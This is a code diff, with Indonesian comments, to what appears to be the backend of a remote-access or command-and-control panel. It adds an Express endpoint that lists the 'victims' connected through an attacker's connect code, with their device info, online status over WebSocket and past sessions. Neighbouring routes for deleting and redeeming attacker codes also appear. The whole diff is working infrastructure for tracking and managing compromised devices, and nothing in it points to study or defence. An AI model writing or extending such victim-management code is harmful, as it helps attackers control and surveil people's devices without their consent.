@@ -301,6 +301,42 @@ app.delete('/api/attacker/codes/:code',auth,(req,res)=>{
   DBupdate(db=>{db.connect_codes=db.connect_codes.filter(c=>!(c.code===req.params.code&&c.attacker_id===req.user.id));res.json({success:true});});
 });
 
+// Tambah endpoint baru (setelah DELETE /api/attacker/codes/:code)
+app.get('/api/attacker/codes/:code/victims', auth, (req, res) => {
+  const code = req.params.code;
+  const db   = DBget();
+
+  // Validasi: kode milik attacker ini
+  const codeEntry = db.connect_codes.find(
+    c => c.code === code && c.attacker_id === req.user.id
+  );
+  if (!codeEntry) return res.json({ success: false, message: 'Code not found' });
+
+  // Ambil victims yang aktif menggunakan kode ini
+  const active = [];
+  victims.forEach((v, id) => {
+    if (v.code === code) {
+      active.push({
+        victimId:   id,
+        deviceInfo: v.deviceInfo || {},
+        pending:    v.pending,
+        online:     v.ws.readyState === WebSocket.OPEN
+      });
+    }
+  });
+
+  // Juga cek accepted sessions (pernah pakai kode ini)
+  const session = acceptedSessions.get(code);
+  const everConnected = session ? session.victimId : null;
+
+  res.json({
+    success:        true,
+    active_victims: active,
+    total:          active.length,
+    ever_connected: everConnected
+  });
+});
+
 app.post('/api/attacker/redeem',auth,(req,res)=>{
   const {code}=req.body;
   DBupdate(db=>{
